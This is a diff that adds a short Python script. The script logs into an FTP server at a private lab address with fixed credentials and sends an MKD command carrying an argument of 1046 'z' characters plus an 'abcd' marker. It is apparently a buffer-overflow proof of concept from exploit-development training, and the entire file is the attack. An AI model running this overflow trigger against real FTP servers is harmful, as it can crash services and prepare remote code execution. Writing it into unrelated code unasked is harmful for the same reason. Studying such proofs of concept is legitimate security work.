@@ -1,0 +1,20 @@
+  from socket import socket, AF_INET, SOCK_STREAM
+  
+  host = "192.168.1.12"
+  port = 21
+  user = "regular"
+  pass_ = "training"
+  
+  commands = [
+        'user regular\n',
+        'pass training\n',
+        'mkd ' + 'z' * 1046 + 'abcd\n'
+  ]
+  
+  s = socket(AF_INET, SOCK_STREAM)
+  s.connect((host, port))
+  s.recv(1024)
+  for line in commands:
+        s.send(line)
+        s.recv(1024)
+  s.close()
